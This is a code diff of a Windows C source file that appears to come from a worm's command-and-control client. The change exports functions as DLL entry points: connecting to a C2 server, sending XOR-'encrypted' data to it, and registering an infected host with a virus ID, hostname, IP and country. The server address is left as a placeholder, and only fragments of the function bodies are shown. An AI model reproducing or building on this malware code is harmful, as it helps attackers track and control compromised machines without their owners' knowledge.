@@ -13,8 +13,6 @@
 #include "networking.h"
 #include <iostream>
 
-
-
 #define DEFAULT_BUFLEN 32
 
 #pragma comment(lib, "Ws2_32.lib")
@@ -24,7 +22,7 @@
 *  Input: the hostname and port of the C2 server
 *  Output: Handle for connection
 */
-SOCKET connect_to_c2(const char *hostname, const char *port){
+__declspec(dllexport) SOCKET connect_to_c2(const char *hostname, const char *port){
 	
 	/* Initialize Winsock */
 	WSADATA wsaData;
@@ -91,7 +89,7 @@ SOCKET connect_to_c2(const char *hostname, const char *port){
 *  Output: Response Packet
 */
 		       
-int send_to_c2(char *encrypted_data, SOCKET ConnectSocket){
+__declspec(dllexport) int send_to_c2(char *encrypted_data, SOCKET ConnectSocket){
 	char recvbuf[DEFAULT_BUFLEN];
 	int iResult;
 
@@ -140,7 +138,7 @@ int send_to_c2(char *encrypted_data, SOCKET ConnectSocket){
 *  Output: Response Packet
 */
 
-char *encryption(char *decrypted_data){
+__declspec(dllexport) char *encryption(char *decrypted_data){
 	int i;
 	//char* encrypted_data = (char*)malloc(32);
 
@@ -165,7 +163,7 @@ char *encryption(char *decrypted_data){
 *  Output: Decrypted Packet
 */
 		       
-char *decryption(char *encrypted_data){
+__declspec(dllexport) char *decryption(char *encrypted_data){
 	int i;
 	//char* decrypted_data = (char*) malloc(32);
 
@@ -189,7 +187,7 @@ char *decryption(char *encrypted_data){
 *  Output: A single combined packet in the correct format
 */
 
-char *structure_init_message(char XOR_key, const char *virus_id, const char *hostname, const char *ip, const char *country){
+__declspec(dllexport) char *structure_init_message(char XOR_key, const char *virus_id, const char *hostname, const char *ip, const char *country){
 
 	/* Allocate buffers */
 	char *buffer = (char*)malloc(sizeof(CHAR) * 32); 
@@ -227,7 +225,7 @@ char *structure_init_message(char XOR_key, const char *virus_id, const char *hos
 *  Output: Server verification
 */
 
-int register_worm(char XOR_key, char *virus_id, char *hostname, char *ip, char *country){
+__declspec(dllexport) int register_worm(char XOR_key, char *virus_id, char *hostname, char *ip, char *country){
 	const char* server_hostname = "idk";
 	const char* client_hostname = "1111";
 	SOCKET sock = connect_to_c2(server_hostname, client_hostname);
